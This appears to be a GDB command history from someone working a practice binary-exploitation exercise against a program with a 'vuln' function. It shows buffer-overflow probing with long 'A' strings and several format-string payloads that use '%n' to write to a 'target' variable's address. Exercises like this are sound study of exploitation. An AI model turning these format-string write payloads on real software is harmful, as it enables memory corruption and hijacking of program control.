disassemble main
q
disassemble main
disassemble vuln
b*main
r
p target
ni
p target
ni
p target
ni
p target
ni
p target
ni
p target
ni
p target
ni
p target
ni
p target
ni
p target
ni
p target
p target
p target
ni
c
exit
q
disassemble vuln
disassemble main
r $(python -c 'print "A" * 64')
r $(python -c 'print "A" * 100')
r $(python -c 'print "A" * 500')
r $(python -c 'print "A" * 100')
b*0x0804848e
r $(python -c 'print "A" * 100')
r $(python -c 'print "A" * 50')
ni
ni
c
q
disassemble main
disassemble vuln
b*0x08048459
r
x /xw $esp
r $(python -c 'print "AAAA%08x"')
x /wx $esp
x /s $esp
x /s 0xffffd32e
r $(python -c 'print "AAAA%138$n"')
c
r $(python -c 'print "AAAA%138$n"')
c
r $(python -c 'print "\x2e\xd3\xff\xff%138$n"')
c
r $(python -c 'print "\x2e\xd3\xff\xff%138\$n"')
r
r $(python -c 'print "\x2e\xd3\xff\xff%138\$n"')
c
q
r $(python -c 'print "\x28\xa0\x04\x08" + "B" * 6 + "%169\$n"')
r $(python -c 'print "\x28\xa0\x04\x08" + "B" * 4 + "%1\$n"')
p target
q
r $(python -c 'print "\x28\xa0\x04\x08%168\$n"'
r $(python -c 'print "\x28\xa0\x04\x08%168$n"'
r $(python -c 'print "\x28\xa0\x04\x08%168\$n"')
disassemble vuln
b*0x08048463
r $(python -c 'print "\x28\xa0\x04\x08%168\$n"')
si
b
del 2
sb
r $(python -c 'print "\x28\xa0\x04\x08%168\$n"')
r $(python -c 'print "\x28\xa0\x04\x08%169\$n"')
r $(python -c 'print "\x28\xa0\x04\x08%170\$n"')
r $(python -c 'print "\x28\xa0\x04\x08%168\$n"')
q
q
